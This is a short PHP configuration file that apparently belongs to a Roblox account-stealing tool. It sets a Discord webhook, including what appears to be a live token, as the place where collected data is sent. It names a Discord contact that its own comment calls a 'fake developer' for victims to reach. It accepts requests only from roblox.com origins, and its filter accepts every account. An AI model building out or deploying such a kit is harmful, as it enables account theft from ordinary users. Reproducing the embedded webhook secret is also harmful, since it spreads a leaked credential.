<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/771948843825758249/urAZs_jpMu7PfJRWoRjfN0cDx-JnCvdpicJJ9Fe1LC1_5UB0xHKFOu79XaQ0ObmsCy7h";
    // fake developer for the bot the users may contact
    $discord_contact = "Frionx#7887";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>